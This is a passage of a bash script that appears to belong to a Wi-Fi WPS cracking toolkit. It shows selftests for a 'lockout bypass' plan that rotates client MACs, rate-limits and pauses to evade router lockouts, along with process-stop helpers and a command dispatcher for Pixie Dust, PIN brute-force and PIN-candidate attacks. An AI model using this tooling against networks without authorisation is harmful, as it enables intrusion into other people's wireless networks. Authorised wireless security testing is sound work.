    plan=$(wps_lockout_bypass_plan aa:bb:cc:dd:ee:ff 02:00:00:00:00:aa wlp5s0 reaver 6)
    pplan() { printf '%s\n' "$plan" | awk -F'\t' -v k="$1" '$1=="PLAN" && $2==k {print $3; exit}'; }
    chk plan-verb     "$(pplan verb)"  "--lockout-bypass"
    chk plan-bssid    "$(pplan bssid)" "aa:bb:cc:dd:ee:ff"
    chk plan-iface    "$(pplan iface)" "wlp5s0"
    chk plan-backend  "$(pplan backend)" "reaver"
    chk plan-strategy "$(pplan strategy)" "rotate-mac + rate-limit + pause-on-lockout"
    chk plan-primary-is-mac-rotation \
        "$(pplan primary | grep -c 'MAC rotation')" "1"
    chk plan-client-mac "$(pplan client_mac)" "02:00:00:00:00:aa"
    chk plan-rotates-within-supplied-mac \
        "$(pplan sample_client_mac)" "02:00:00:00:00:ab"
    chk plan-rotation-cmd-carries-mac \
        "$(pplan mac_rotation_cmd | grep -c '02:00:00:00:00:ab')" "1"
    chk plan-rate-limit "$(pplan rate_limit | grep -c 'delay 1s')" "1"
    chk plan-lock-pause "$(pplan lock_delay | grep -c 'pauses 60s')" "1"
    chk plan-steps "$(printf '%s\n' "$plan" | grep -c $'^PLAN\tstep\t')" "4"
    chk plan-honesty "$(pplan honesty | grep -c 'failure')" "1"
    # A random-MAC plan must not leak a fixed client MAC.
    local plan2
    plan2=$(wps_lockout_bypass_plan aa:bb:cc:dd:ee:ff "" wlp5s0 reaver 6)
    chk plan-random-client "$(printf '%s\n' "$plan2" | awk -F'\t' '$2=="client_mac"{print $3}')" \
        "random-per-window"
    # Every PLAN row is TSV: exactly three fields, no stray tabs.
    chk plan-tsv-shape "$(printf '%s\n' "$plan" | awk -F'\t' 'NF!=3{n++} END{print n+0}')" "0"

    rm -rf "$st"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ═══════════════════════════════════════════════════════════════════
#  dispatch
# ═══════════════════════════════════════════════════════════════════

# ── verified stop ──
# Escalating signals; returns 0 ONLY once the pid is actually gone. Signals
# the process group first so forked children die with the leader. Stops that
# print STOPPED and delete the pidfile without this can strand a capture with
# no remaining handle to it, making the stop button useless.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
# Returns non-zero only if something matched and SURVIVED.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

wps_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)       wps_cli_status_tsv ;;
        --scan-tsv)         wps_cli_scan_tsv "$@" ;;
        --restore-mac)    wps_restore_mac "${2:-}" ;;
        --start)            wps_cli_start "$@" ;;
        --stop)             wps_cli_stop ;;
        --log)              wps_cli_log ;;
        --harvest)          wps_cli_harvest ;;
        --results-tsv)      wps_cli_results_tsv ;;
        --pin-candidates)   wps_cli_pin_candidates "$@" ;;
        --offline-pixie)    wps_cli_offline_pixie "$@" ;;
        --lockout-bypass)   wps_cli_lockout_bypass "$@" ;;
        --selftest)         wps_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --scan-tsv [DURATION]
  --restore-mac [IFACE]         restore the burned-in hardware MAC
  --start METHOD(pixie|pin|brute) BSSID CHANNEL [ESSID] [reaver|bully]
  --stop
  --log
  --harvest
  --results-tsv
  --pin-candidates MAC [OUTFILE] [SERIAL]
  --offline-pixie [LOG]
  --lockout-bypass BSSID [CLIENT_MAC]
  --selftest
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    wps_cli_main "$@"
fi
